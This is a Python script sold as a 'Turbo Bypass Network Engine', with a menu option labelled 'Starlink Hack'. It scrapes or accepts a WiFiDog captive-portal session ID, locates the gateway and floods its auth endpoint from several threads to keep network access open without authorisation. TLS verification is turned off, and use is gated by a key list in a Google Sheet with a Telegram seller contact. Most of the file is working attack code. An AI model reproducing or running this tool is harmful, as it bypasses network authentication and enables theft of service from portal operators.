#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import urllib3
import time
import threading
import logging
import random
import os
import sys
import subprocess
import importlib.util
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# COLOR SYSTEM
# ===============================
black = "\033[0;30m"
red = "\033[0;31m"
bred = "\033[1;31m"
green = "\033[0;32m"
bgreen = "\033[1;32m"
yellow = "\033[0;33m"
byellow = "\033[1;33m"
blue = "\033[0;34m"
bblue = "\033[1;34m"
purple = "\033[0;35m"
bpurple = "\033[1;35m"
cyan = "\033[0;36m"
bcyan = "\033[1;36m"
white = "\033[0;37m"
reset = "\033[00m"

# ===============================
# KEY APPROVAL SYSTEM
# ===============================
SHEET_ID = "1ZpI1hkkkvc1J41qDWvcAREKQCODbS1jXO91lDb8ZqJo"
SHEET_CSV_URL = f"https://docs.google.com/spreadsheets/d/{SHEET_ID}/export?format=csv&gid=0"
LOCAL_KEYS_FILE = os.path.expanduser("~/.turbo_approved_keys.txt")

def get_system_key():
    try: uid = os.geteuid()
    except AttributeError: uid = 1000
    try: username = os.getlogin()
    except: username = os.environ.get('USER', 'unknown')
    return f"{uid}{username}"

def fetch_authorized_keys():
    keys = []
    try:
        response = requests.get(SHEET_CSV_URL, timeout=10)
        if response.status_code == 200:
            for line in response.text.strip().split('\n'):
                line = line.strip()
                if line and not line.startswith('username') and not line.startswith('key'):
                    key = line.split(',')[0].strip().strip('"')
                    if key: keys.append(key)
            if keys:
                with open(LOCAL_KEYS_FILE, 'w') as f: f.write('\n'.join(keys))
            return keys
    except: pass
    try:
        if os.path.exists(LOCAL_KEYS_FILE):
            with open(LOCAL_KEYS_FILE, 'r') as f:
                keys = [line.strip() for line in f if line.strip()]
            return keys
    except: pass
    return keys

def check_approval():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{bcyan}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                    KEY APPROVAL SYSTEM                               ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{reset}")
    system_key = get_system_key()
    authorized_keys = fetch_authorized_keys()
    if system_key in authorized_keys:
        print(f"\n{bgreen}[✓] KEY APPROVED! Unlocking Turbo Engine...{reset}")
        time.sleep(1)
        return True
    else:
        print(f"\n{bred}❌ KEY NOT APPROVED ❌{reset}")
        print(f"{yellow}ID: {system_key}{reset}\n{bcyan}Contact: @CYCLEA7 on Telegram{reset}")
        return False

# ===============================
# BANNER DISPLAY
# ===============================
def display_banner():
    banner_text = f"""
{bred}    ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
    ┃{bcyan}  ████████╗██╗   ██╗██████╗ ██████╗  ██████╗      {bred}┃
    ┃{bcyan}  ╚══██╔══╝██║   ██║██╔══██╗██╔══██╗██╔═══██╗     {bred}┃
    ┃{bcyan}     ██║   ██║   ██║██████╔╝██████╔╝██║   ██║     {bred}┃
    ┃{bcyan}     ██║   ██║   ██║██╔══██╗██╔══██╗██║   ██║     {bred}┃
    ┃{bcyan}     ██║   ╚██████╔╝██║  ██║██████╔╝╚██████╔╝     {bred}┃
    ┃{bcyan}     ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═════╝  ╚═════╝      {bred}┃
    ┃{bcyan}        >>> BYPASS NETWORK ENGINE <<<             {bred}┃
    ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{reset}
    """
    print(banner_text)
    time.sleep(1)

# ===============================
# AUTO INSTALLER
# ===============================
def auto_install_dependencies():
    required = ['requests', 'urllib3']
    for pkg in required:
        if importlib.util.find_spec(pkg) is None:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', pkg, '--quiet'])

# ===============================
# TURBO ENGINE CORE
# ===============================
PING_THREADS = 5
stop_event = threading.Event()

def check_real_internet():
    try: return requests.get("http://www.google.com", timeout=3).status_code == 200
    except: return False

def high_speed_ping(auth_link, sid):
    session = requests.Session()
    while not stop_event.is_set():
        try:
            start = time.time()
            session.get(auth_link, timeout=5)
            elapsed = (time.time() - start) * 1000
            print(f"{bgreen}[✓]{reset} SID {sid[:8]} | Ping: {elapsed:.1f}ms", end="\r")
        except: pass
        time.sleep(random.uniform(0.05, 0.2))

def start_turbo_engine():
    os.system('clear' if os.name == 'posix' else 'cls')
    display_banner()
    
    # --- SID OPTION MENU ---
    print(f"{bcyan}╔════════════════════════════════════════════════╗")
    print(f"║             SESSION ID (SID) OPTION            ║")
    print(f"╠════════════════════════════════════════════════╣")
    print(f"║                                                ║")
    print(f"║    {bgreen}[1]{reset} Auto Scan (အလိုအလျောက် ဖမ်းယူမည်)           ║")
    print(f"║    {byellow}[2]{reset} Manual Input (ကိုယ်တိုင် ရိုက်ထည့်မည်)        ║")
    print(f"║                                                ║")
    print(f"╚════════════════════════════════════════════════╝{reset}")
    
    sid_choice = input(f"{bcyan}[?]{reset} နည်းလမ်းရွေးချယ်ပါ [1-2]: ").strip()
    
    sid = None
    if sid_choice == '2':
        sid = input(f"\n{bcyan}[+]{reset} သင့်ရဲ့ Session ID (SID) ကို ရိုက်ထည့်ပါ: ").strip()
        if not sid:
            print(f"{red}[X] Error: SID မရှိဘဲ ရှေ့ဆက်၍မရပါ!{reset}")
            time.sleep(2)
            return

    print(f"\n{bcyan}[*] Initializing Turbo Engine...{reset}")

    while not stop_event.is_set():
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        try:
            # Automatic detection only if SID is not provided manually
            if not sid:
                r = requests.get(test_url, allow_redirects=True, timeout=5)
                portal_url = r.url
                parsed_portal = urlparse(portal_url)
                portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"

                r1 = session.get(portal_url, verify=False, timeout=10)
                path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
                next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
                r2 = session.get(next_url, verify=False, timeout=10)

                sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
                if not sid:
                    sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                    sid = sid_match.group(1) if sid_match else None
                
                if not sid:
                    print(f"\n{red}[!] Auto Scan ဖြင့် SID ရှာမတွေ့ပါ။ Manual ရိုက်ထည့်ပေးပါ။{reset}")
                    sid = input(f"{bcyan}[+]{reset} SID: ").strip()
                    if not sid: continue
            
            # Gateway detection (Required even for manual SID to get gw_address)
            r_detect = requests.get(test_url, allow_redirects=True, timeout=5)
            params = parse_qs(urlparse(r_detect.url).query)
            gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
            gw_port = params.get('gw_port', ['2060'])[0]
            
            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"

            print(f"\n{bgreen}[✓] Engine Ready with SID: {sid}{reset}")
            print(f"{bcyan}[*] Gateway Address: {gw_addr}:{gw_port}{reset}")

            for _ in range(PING_THREADS):
                threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()

            while not stop_event.is_set():
                if not check_real_internet(): 
                    print(f"\n{red}[X] Connection Lost! Attempting to restart...{reset}")
                    break
                time.sleep(5)

        except KeyboardInterrupt: raise
        except Exception as e:
            time.sleep(5)

# ===============================
# MENU & MAIN SYSTEM
# ===============================
def show_menu():
    os.system('clear' if os.name == 'posix' else 'cls')
    display_banner()
    print(f"{bcyan}╔════════════════════════════════════════════════╗")
    print(f"║                   MAIN MENU                    ║")
    print(f"╠════════════════════════════════════════════════╣")
    print(f"║                                                ║")
    print(f"║    {bgreen}[1]{reset} Starlink Hack (Start Engine)            ║")
    print(f"║    {bred}[2]{reset} Exit (Close Program)                   ║")
    print(f"║                                                ║")
    print(f"╚════════════════════════════════════════════════╝{reset}")
    return input(f"{bcyan}[?]{reset} Select option [1-2]: ").strip()

def main():
    auto_install_dependencies()
    if not check_approval(): sys.exit()
    while True:
        choice = show_menu()
        if choice == '1':
            try: 
                stop_event.clear()
                start_turbo_engine()
            except KeyboardInterrupt: 
                stop_event.set()
                print(f"\n{red}Engine Stopped. Returning to menu...{reset}")
                time.sleep(1)
        elif choice == '2': 
            print(f"\n{green}[✓] Thank you for using Turbo Engine!{reset}")
            sys.exit()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{red}Program Terminated.{reset}")
        sys.exit()
    
